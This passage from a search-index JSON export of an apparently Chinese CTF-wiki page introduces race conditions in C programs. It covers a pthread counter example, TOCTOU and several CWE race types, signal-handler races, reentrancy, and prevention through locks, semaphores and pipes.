Inspector\n\n\nValgrind\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.teraits.com/pitagoras/marcio/segapp/05.ppt\n\n\nhttp://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf\n\n\nhttps://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf\n\n\nhttps://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html\n\n\nhttps://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf\n\n\nhttp://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html\n\n\nhttp://www.cnblogs.com/huxiao-tee/p/4660352.html\n\n\nhttps://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u6761\u4ef6\u7ade\u4e89\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#race-condition", 
            "text": "", 
            "title": "Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_1", 
            "text": "\u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002   \u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df   \u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def  \u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002   \u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002  \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684 \u6761\u4ef6 \uff1a   \u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002  \u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002 \u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a \u4e34\u754c\u533a \u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002  \u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002   \u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9 \u96be\u5bdf\u89c9 \uff0c\u5e76\u4e14\u5728 \u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be \u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002  \u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002  \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002  #include   pthread.h  #include   stdio.h  int   counter ;  void   * IncreaseCounter ( void   * args )   { \n   counter   +=   1 ; \n   sleep ( 0.1 ); \n   printf ( Thread %d has counter value %d \\n ,   ( unsigned   int ) pthread_self (), \n          counter );  }  int   main ()   { \n   pthread_t   p [ 10 ]; \n   for   ( int   i   =   0 ;   i     10 ;   ++ i )   { \n     pthread_create ( p [ i ],   NULL ,   IncreaseCounter ,   NULL ); \n   } \n   for   ( int   i   =   0 ;   i     10 ;   ++ i )   { \n     pthread_join ( p [ i ],   NULL ); \n   } \n   return   0 ;  }   \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa  \u279c  005race_condition ./example1\nThread  1859024640  has counter value  1 \nThread  1841583872  has counter value  2 \nThread  1832863488  has counter value  3 \nThread  1824143104  has counter value  4 \nThread  1744828160  has counter value  5 \nThread  1736107776  has counter value  6 \nThread  1727387392  has counter value  7 \nThread  1850304256  has counter value  8 \nThread  1709946624  has counter value  9 \nThread  1718667008  has counter value  10   \u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f  \u279c    005 race_condition   . / example1                            Thread   1417475840   has   counter   value   2  Thread   1408755456   has   counter   value   2  Thread   1391314688   has   counter   value   8  Thread   1356433152   has   counter   value   8  Thread   1365153536   has   counter   value   8  Thread   1373873920   has   counter   value   8  Thread   1382594304   has   counter   value   8  Thread   1400035072   has   counter   value   8  Thread   1275066112   has   counter   value   9  Thread   1266345728   has   counter   value   10   \u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50   \u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002  \u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002    \u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002 \u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_2", 
            "text": "\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002", 
            "title": "\u5f62\u5f0f"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-367-toctou-race-condition", 
            "text": "", 
            "title": "CWE-367: TOCTOU Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_3", 
            "text": "TOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002   \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002", 
            "title": "\u63cf\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-365-race-condition-in-switch", 
            "text": "\u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002", 
            "title": "CWE-365: Race Condition in Switch"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-363-race-condition-enabling-link-following", 
            "text": "\u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f   \u6587\u4ef6\u8def\u5f84\u540d  \u6587\u4ef6\u63cf\u8ff0\u7b26   \u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c   \u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09 \u95f4\u63a5\u89e3\u6790 \u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002  \u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002   \u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002  \u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002   \u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026  \u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684  st_ino  \u548c  st_dev  \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6   st_ino  \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373  i-node  st_dev  \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002", 
            "title": "CWE-363: Race Condition Enabling Link Following"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-364-signal-handler-race-condition", 
            "text": "", 
            "title": "CWE-364: Signal Handler Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_4", 
            "text": "\u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f \u4e0d\u53ef\u91cd\u5165 \u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709   \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002  \u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002  \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002  \u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002  \u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_5", 
            "text": "\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002   \u7ebf\u7a0b\u5b89\u5168  \u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002  \u6761\u4ef6  \u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90  \u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002      \u53ef\u91cd\u7528  \u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002  \u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002  \u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002  \u4e0d\u6ee1\u8db3\u6761\u4ef6  \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf  \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570  \u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002  \u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002    \u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 \u8c03\u7528\u6808 \u7684\u5f53\u524d \u51fd\u6570\u6808 \uff08frame\uff09\u4e0a\u3002", 
            "title": "\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_6", 
            "text": "\u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002  \u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002", 
            "title": "\u9632\u8303"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_7", 
            "text": "\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b   \u9501\u53d8\u91cf  \u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002  \u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002    \u6761\u4ef6\u53d8\u91cf  \u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002     \u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION    \u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002   \u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002  \u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002   # \u521b\u5efa\u7ba1\u9053\nmkfifo my_pipe\n# gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d\ngzip -9 -c   my_pipe   out.gz  \n# \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e\ncat file   my_pipe", 
            "title": "\u540c\u6b65\u539f\u8bed"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_8", 
            "text": "", 
            "title": "\u6b7b\u9501"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_9", 
